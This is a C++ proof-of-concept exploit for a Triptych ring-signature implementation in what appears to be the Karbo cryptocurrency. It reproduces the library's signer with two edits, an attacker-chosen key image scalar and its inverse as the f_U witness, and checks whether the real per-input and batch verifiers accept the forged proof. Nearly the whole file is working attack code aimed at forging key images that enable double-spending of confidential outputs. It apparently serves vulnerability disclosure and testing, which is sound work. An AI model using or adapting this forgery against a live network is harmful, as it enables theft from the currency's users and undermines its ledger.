// PoC: forge a second, distinct, VALID Triptych key image for the same output.
//
// If this prints "VULNERABLE", then triptych_verify accepts a proof whose
// key image is c*Hp(P_l) for an attacker-chosen c != x (the spend key),
// i.e. the linking tag is NOT bound to the spend key and confidential
// outputs can be double-spent.
//
// The signer below is a verbatim copy of Crypto::triptych_sign's logic with
// exactly two changes, both marked "FORGE":
//   1. key image  I = c * Hp(P_l)   (instead of x * Hp(P_l))
//   2. f_U witness = 1/c            (instead of 1/x)
// Everything else (P-ring uses real x, M-ring uses real z, bits, challenge)
// is unchanged. We then call the real library Crypto::triptych_verify.

#include "crypto/triptych.h"
#include "crypto/pedersen.h"
#include "crypto/random.h"
#include "crypto/hash.h"

#include <cstdio>
#include <cstring>
#include <vector>
#include <array>

extern "C" {
#include "crypto/crypto-ops.h"
}

using namespace Crypto;

// ───────────────────────── helpers copied from triptych.cpp ─────────────────
namespace forge {

static size_t log2_ring(size_t ring_size) {
  switch (ring_size) { case 4: return 2; case 8: return 3; case 16: return 4; default: return 0; }
}
static void random_scalar(EllipticCurveScalar& res) {
  unsigned char tmp[64]; Random::randomBytes(64, tmp); sc_reduce(tmp);
  std::memcpy(&res, tmp, 32);
}
static void p3_to_bytes(unsigned char out[32], const ge_p3* p) { ge_p3_tobytes(out, p); }
static bool p2_to_p3(ge_p3* out, const ge_p2* in) {
  unsigned char bytes[32]; ge_tobytes(bytes, in); return ge_frombytes_vartime(out, bytes) == 0;
}
static void point_add(ge_p3* out, const ge_p3* a, const ge_p3* b) {
  ge_cached bc; ge_p3_to_cached(&bc, b); ge_p1p1 r; ge_add(&r, a, &bc); ge_p1p1_to_p3(out, &r);
}
static bool scalarmult_p3(ge_p3* out, const unsigned char s[32], const ge_p3* P) {
  ge_p2 r; ge_scalarmult(&r, s, P); return p2_to_p3(out, &r);
}
static void hash_to_ec(const PublicKey& key, ge_p3& res) {
  Hash h; ge_p2 point; ge_p1p1 point2;
  cn_fast_hash(std::addressof(key), sizeof(PublicKey), h);
  ge_fromfe_frombytes_vartime(&point, reinterpret_cast<const unsigned char*>(&h));
  ge_mul8(&point2, &point); ge_p1p1_to_p3(&res, &point2);
}
static void sc_invert(unsigned char out[32], const unsigned char in[32]) {
  static const unsigned char L_minus_2[32] = {
    0xeb,0xd3,0xf5,0x5c,0x1a,0x63,0x12,0x58,0xd6,0x9c,0xf7,0xa2,0xde,0xf9,0xde,0x14,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10 };
  unsigned char acc[32]; sc_0(acc); acc[0]=1;
  unsigned char base[32]; std::memcpy(base, in, 32);
  for (int bi=0; bi<32; ++bi) for (int b=0;b<8;++b){
    if ((L_minus_2[bi]>>b)&1) sc_mul(acc, acc, base);
    sc_mul(base, base, base);
  }
  std::memcpy(out, acc, 32);
}
static void compute_challenge(
  const Hash& message, size_t ring_size, size_t n_bits, size_t n_q,
  const PublicKey ring_pubkeys[], const EllipticCurvePoint ring_commits[],
  const EllipticCurvePoint& pseudo_commit, const KeyImage& key_image,
  const ge_p3* I_bits, const ge_p3* A, const ge_p3* B,
  const ge_p3* Q_P, const ge_p3* Q_M, const ge_p3* Q_U, EllipticCurveScalar& challenge) {
  static const char domain[] = "Triptych-KarboCT-v1";
  const size_t dl = sizeof(domain)-1;
  const size_t buf_size = dl + 32 + 1 + 32*ring_size + 32*ring_size + 32 + 32
                        + 32*n_bits*3 + 32*n_q*3;
  std::vector<unsigned char> buf(buf_size); unsigned char* p = buf.data();
  std::memcpy(p, domain, dl); p+=dl;
  std::memcpy(p, &message, 32); p+=32;
  *p++ = (unsigned char)ring_size;
  for (size_t k=0;k<ring_size;++k){ std::memcpy(p,&ring_pubkeys[k],32); p+=32; }
  for (size_t k=0;k<ring_size;++k){ std::memcpy(p,&ring_commits[k],32); p+=32; }
  std::memcpy(p,&pseudo_commit,32); p+=32;
  std::memcpy(p,&key_image,32); p+=32;
  for (size_t j=0;j<n_bits;++j){ p3_to_bytes(p,&I_bits[j]); p+=32; }
  for (size_t j=0;j<n_bits;++j){ p3_to_bytes(p,&A[j]); p+=32; }
  for (size_t j=0;j<n_bits;++j){ p3_to_bytes(p,&B[j]); p+=32; }
  for (size_t m=0;m<n_q;++m){ p3_to_bytes(p,&Q_P[m]); p+=32; }
  for (size_t m=0;m<n_q;++m){ p3_to_bytes(p,&Q_M[m]); p+=32; }
  for (size_t m=0;m<n_q;++m){ p3_to_bytes(p,&Q_U[m]); p+=32; }
  cn_fast_hash(buf.data(), buf_size, reinterpret_cast<Hash&>(challenge));
  sc_reduce32(challenge.data);
}
static void compute_poly_coeffs(size_t ring_size, size_t n, const int bits[],
  const EllipticCurveScalar a[], std::vector<std::vector<EllipticCurveScalar>>& pc) {
  unsigned char zero[32]; sc_0(zero);
  pc.assign(ring_size, std::vector<EllipticCurveScalar>(n+1));
  for (size_t k=0;k<ring_size;++k){
    std::vector<std::array<unsigned char,32>> poly(n+1);
    for (auto& c: poly) std::memset(c.data(),0,32);
    poly[0][0]=1; size_t cd=0;
    for (size_t j=0;j<n;++j){
      int k_j=(k>>j)&1; int l_j=bits[j];
      unsigned char fc[32], fl[32];
      if (k_j==1){ std::memcpy(fc,a[j].data,32); std::memset(fl,0,32); if(l_j) fl[0]=1; }
      else { sc_sub(fc,zero,a[j].data); std::memset(fl,0,32); if(!l_j) fl[0]=1; }
      std::vector<std::array<unsigned char,32>> np(n+1);
      for (auto& c: np) std::memset(c.data(),0,32);
      for (size_t i=0;i<=cd+1;++i){
        unsigned char t1[32],t2[32]; sc_mul(t1,fc,poly[i].data());
        if (i>0){ sc_mul(t2,fl,poly[i-1].data()); sc_add(np[i].data(),t1,t2); }
        else std::memcpy(np[i].data(),t1,32);
      }
      cd++; poly=std::move(np);
    }
    for (size_t i=0;i<=n;++i) std::memcpy(pc[k][i].data, poly[i].data(),32);
  }
}

// Verbatim triptych_sign with two FORGE edits (key image and f_U witness).
static bool triptych_sign_forged(
  const Hash& message, const PublicKey ring_pubkeys[], const EllipticCurvePoint ring_commits[],
  const EllipticCurvePoint& pseudo_commit, size_t ring_size, size_t true_index,
  const SecretKey& spend_privkey, const EllipticCurveScalar& real_blinding,
  const EllipticCurveScalar& pseudo_blinding,
  const EllipticCurveScalar& image_scalar,   // FORGE: c, used for the key image
  KeyImage& key_image, TriptychSignature& sig) {
  const size_t n = log2_ring(ring_size);
  ge_p3 hp_real; hash_to_ec(ring_pubkeys[true_index], hp_real);
  ge_p2 image_p2;
  // FORGE #1: key image = c * Hp(P_l)  (honest would use spend_privkey here)
  ge_scalarmult(&image_p2, reinterpret_cast<const unsigned char*>(&image_scalar), &hp_real);
  ge_tobytes(reinterpret_cast<unsigned char*>(&key_image), &image_p2);
  ge_p3 I_p3; if (ge_frombytes_vartime(&I_p3, reinterpret_cast<const unsigned char*>(&key_image))!=0) return false;

  EllipticCurveScalar z_witness;
  sc_sub(reinterpret_cast<unsigned char*>(&z_witness),
         reinterpret_cast<const unsigned char*>(&real_blinding),
         reinterpret_cast<const unsigned char*>(&pseudo_blinding));

  ge_p3 pseudo_p3; if (ge_frombytes_vartime(&pseudo_p3, reinterpret_cast<const unsigned char*>(&pseudo_commit))!=0) return false;
  ge_cached pseudo_cached; ge_p3_to_cached(&pseudo_cached,&pseudo_p3);
  std::vector<ge_p3> P(ring_size),M(ring_size),U(ring_size);
  for (size_t k=0;k<ring_size;++k){
    if (ge_frombytes_vartime(&P[k], reinterpret_cast<const unsigned char*>(&ring_pubkeys[k]))!=0) return false;
    ge_p3 Ck; if (ge_frombytes_vartime(&Ck, reinterpret_cast<const unsigned char*>(&ring_commits[k]))!=0) return false;
    ge_p1p1 d; ge_sub(&d,&Ck,&pseudo_cached); ge_p1p1_to_p3(&M[k],&d);
    hash_to_ec(ring_pubkeys[k], U[k]);
  }
  sig.I_bits.resize(n); sig.A.resize(n); sig.B.resize(n); sig.Q_P.resize(n);
  sig.Q_M.resize(n); sig.Q_U.resize(n); sig.z.resize(n); sig.za.resize(n); sig.zb.resize(n);
  std::vector<int> bits(n); for (size_t j=0;j<n;++j) bits[j]=(true_index>>j)&1;
  std::vector<EllipticCurveScalar> r_j(n),a_j(n),s_j(n),t_j(n);
  for (size_t j=0;j<n;++j){ random_scalar(r_j[j]); random_scalar(a_j[j]); random_scalar(s_j[j]); random_scalar(t_j[j]); }
  ge_p3 H_p3; if (ge_frombytes_vartime(&H_p3, reinterpret_cast<const unsigned char*>(&pedersen_get_H()))!=0) return false;
  std::vector<ge_p3> Ib(n),Ap(n),Bp(n);
  for (size_t j=0;j<n;++j){
    ge_p3 rG; ge_scalarmult_base(&rG, r_j[j].data);
    if (bits[j]) point_add(&Ib[j],&rG,&H_p3); else Ib[j]=rG;
    ge_p3 sG,aH; ge_scalarmult_base(&sG,s_j[j].data); if(!scalarmult_p3(&aH,a_j[j].data,&H_p3)) return false;
    point_add(&Ap[j],&sG,&aH);
    ge_p3 tG; ge_scalarmult_base(&tG,t_j[j].data);
    if (bits[j]) point_add(&Bp[j],&tG,&aH); else Bp[j]=tG;
  }
  std::vector<std::vector<EllipticCurveScalar>> pc;
  compute_poly_coeffs(ring_size,n,bits.data(),a_j.data(),pc);
  std::vector<EllipticCurveScalar> rho_P(n),rho_M(n),sig_U(n);
  std::vector<ge_p3> QP(n),QM(n),QU(n);
  for (size_t m=0;m<n;++m){
    random_scalar(rho_P[m]); random_scalar(rho_M[m]); random_scalar(sig_U[m]);
    ge_p3 sP,sM,sU; ge_scalarmult_base(&sP,rho_P[m].data); ge_scalarmult_base(&sM,rho_M[m].data);
    if(!scalarmult_p3(&sU,sig_U[m].data,&I_p3)) return false;
    for (size_t k=0;k<ring_size;++k){
      const unsigned char* co=pc[k][m].data; if(!sc_isnonzero(co)) continue;
      ge_p3 tP,tM,tU;
      if(!scalarmult_p3(&tP,co,&P[k])) return false;
      if(!scalarmult_p3(&tM,co,&M[k])) return false;
      if(!scalarmult_p3(&tU,co,&U[k])) return false;
      point_add(&sP,&sP,&tP); point_add(&sM,&sM,&tM); point_add(&sU,&sU,&tU);
    }
    QP[m]=sP; QM[m]=sM; QU[m]=sU;
  }
  EllipticCurveScalar x_chal;
  compute_challenge(message,ring_size,n,n,ring_pubkeys,ring_commits,pseudo_commit,key_image,
                    Ib.data(),Ap.data(),Bp.data(),QP.data(),QM.data(),QU.data(),x_chal);
  for (size_t j=0;j<n;++j){
    if (bits[j]) sc_add(sig.z[j].data,x_chal.data,a_j[j].data); else std::memcpy(sig.z[j].data,a_j[j].data,32);
    unsigned char term[32]; sc_mul(term,r_j[j].data,x_chal.data); sc_add(sig.za[j].data,term,s_j[j].data);
    unsigned char xmz[32]; sc_sub(xmz,x_chal.data,sig.z[j].data); sc_mul(term,r_j[j].data,xmz); sc_add(sig.zb[j].data,term,t_j[j].data);
  }
  unsigned char x_pow[5][32]; std::memset(x_pow[0],0,32); x_pow[0][0]=1;
  if (n>=1) std::memcpy(x_pow[1],x_chal.data,32);
  for (size_t i=2;i<=n;++i) sc_mul(x_pow[i],x_pow[i-1],x_chal.data);
  // FORGE #2: f_U witness = 1/c  (honest would use 1/spend_privkey)
  unsigned char c_inv[32]; sc_invert(c_inv, reinterpret_cast<const unsigned char*>(&image_scalar));
  sc_mul(sig.f_P.data, reinterpret_cast<const unsigned char*>(&spend_privkey), x_pow[n]); // real x
  sc_mul(sig.f_M.data, z_witness.data, x_pow[n]);                                          // real z
  sc_mul(sig.f_U.data, c_inv, x_pow[n]);                                                   // 1/c
  for (size_t m=0;m<n;++m){
    unsigned char term[32];
    sc_mul(term,rho_P[m].data,x_pow[m]); sc_sub(sig.f_P.data,sig.f_P.data,term);
    sc_mul(term,rho_M[m].data,x_pow[m]); sc_sub(sig.f_M.data,sig.f_M.data,term);
    sc_mul(term,sig_U[m].data,x_pow[m]); sc_sub(sig.f_U.data,sig.f_U.data,term);
  }
  for (size_t j=0;j<n;++j){
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.I_bits[j]),&Ib[j]);
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.A[j]),&Ap[j]);
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.B[j]),&Bp[j]);
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.Q_P[j]),&QP[j]);
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.Q_M[j]),&QM[j]);
    p3_to_bytes(reinterpret_cast<unsigned char*>(&sig.Q_U[j]),&QU[j]);
  }
  return true;
}
} // namespace forge

static void gen_keypair(PublicKey& pub, SecretKey& sec) {
  unsigned char tmp[64]; Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&sec,tmp,32);
  ge_p3 pt; ge_scalarmult_base(&pt, reinterpret_cast<const unsigned char*>(&sec));
  ge_p3_tobytes(reinterpret_cast<unsigned char*>(&pub), &pt);
}
static void u64s(uint64_t v, EllipticCurveScalar& s){ std::memset(s.data,0,32); for(int i=0;i<8;++i) s.data[i]=(unsigned char)(v>>(8*i)); }

int main() {
  const size_t N=8, idx=3; const uint64_t amount=1000;
  std::vector<PublicKey> pub(N); std::vector<EllipticCurvePoint> com(N);
  SecretKey x; EllipticCurveScalar rr, rp, vsc; u64s(amount, vsc);
  gen_keypair(pub[idx], x);
  unsigned char tmp[64]; Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&rr,tmp,32);
  pedersen_commit(vsc, rr, com[idx]);
  for (size_t i=0;i<N;++i){ if(i==idx) continue; SecretKey d; gen_keypair(pub[i],d);
    EllipticCurveScalar dr,dv; Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&dr,tmp,32);
    Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&dv,tmp,32); pedersen_commit(dv,dr,com[i]); }
  EllipticCurvePoint pseudo; Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&rp,tmp,32);
  pedersen_commit(vsc, rp, pseudo);

  Hash msg; Random::randomBytes(32, msg.data);

  // Honest key image for reference.
  KeyImage ki_honest; TriptychSignature sig_h;
  if (!triptych_sign(msg, pub.data(), com.data(), pseudo, N, idx, x, rr, rp, ki_honest, sig_h)) {
    printf("honest sign failed\n"); return 2; }
  bool honest_ok = triptych_verify(msg, pub.data(), com.data(), pseudo, N, ki_honest, sig_h);
  printf("honest verify: %s\n", honest_ok?"OK":"FAIL");

  // Forge: pick c != x, build key image c*Hp(P) and witness 1/c in f_U.
  EllipticCurveScalar c; Random::randomBytes(64,tmp); sc_reduce(tmp); std::memcpy(&c,tmp,32);
  KeyImage ki_forged; TriptychSignature sig_f;
  if (!forge::triptych_sign_forged(msg, pub.data(), com.data(), pseudo, N, idx, x, rr, rp, c, ki_forged, sig_f)) {
    printf("forge sign failed\n"); return 2; }

  bool forged_ok = triptych_verify(msg, pub.data(), com.data(), pseudo, N, ki_forged, sig_f);
  bool diff = std::memcmp(&ki_honest, &ki_forged, 32) != 0;
  printf("forged verify (per-input): %s\n", forged_ok?"ACCEPTED":"rejected");
  printf("key images differ: %s\n", diff?"YES":"no");

  // The real consensus path uses the batched verifier — confirm it too.
  const PublicKey* rp_arr[1] = { pub.data() };
  const EllipticCurvePoint* rc_arr[1] = { com.data() };
  EllipticCurvePoint pc_arr[1] = { pseudo };
  size_t rs_arr[1] = { N };
  KeyImage ki_arr[1] = { ki_forged };
  TriptychSignature sg_arr[1] = { sig_f };
  bool forged_batch_ok = triptych_verify_batch(msg, rp_arr, rc_arr, pc_arr, rs_arr, ki_arr, sg_arr, 1);
  printf("forged verify (batch/consensus path): %s\n", forged_batch_ok?"ACCEPTED":"rejected");
  forged_ok = forged_ok && forged_batch_ok;

  if (forged_ok && diff) {
    printf("\n*** VULNERABLE: a second, distinct, VALID key image was accepted ***\n");
    printf("    => the same confidential output can be spent multiple times.\n");
    return 0;
  }
  printf("\nnot vulnerable (forged proof rejected or same key image)\n");
  return 1;
}
